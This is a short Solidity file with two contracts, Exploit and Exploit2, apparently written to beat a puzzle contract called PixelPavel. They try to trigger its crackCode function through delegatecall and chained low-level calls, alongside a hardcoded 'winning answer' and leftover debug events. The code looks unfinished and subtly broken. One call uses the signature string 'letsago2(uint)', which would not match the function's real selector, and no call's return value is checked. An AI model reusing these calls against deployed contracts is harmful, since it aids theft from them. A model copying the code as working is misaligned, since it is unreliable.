pragma solidity 0.7.6;

import './PixelPavel.sol';

contract Exploit {

    uint256 constant public bigPrizeWinningAnswer = 298;

    event Probeo1(bytes32 hash);
    event Probeo2(bytes32 hash);
    event Probeo3(bytes _data);
    PixelPavel capullo;

    constructor(PixelPavel instanciote) {
        capullo = instanciote;
    }

    function mirarPrimerHash() external {
        emit Probeo3(abi.encode(bigPrizeWinningAnswer));
    }

    function letsago2(uint _val) external {
        address(capullo).delegatecall(abi.encodeWithSignature('crackCode(uint8)', 42));
    }

}

contract Exploit2 {

    uint256 constant public bigPrizeWinningAnswer = 298;

    event Probeo1(bytes32 hash);
    event Probeo2(bytes32 hash);
    event Probeo3(bytes _data);

    constructor() {

    }

    function letsago(Exploit instancia) external {
        address(instancia).call(abi.encodeWithSignature('letsago2(uint)', 298));
        //emit Probeo3(abi.encodeWithSignature('crackCode(uint8 _smallAnswer)', _val));
    }

}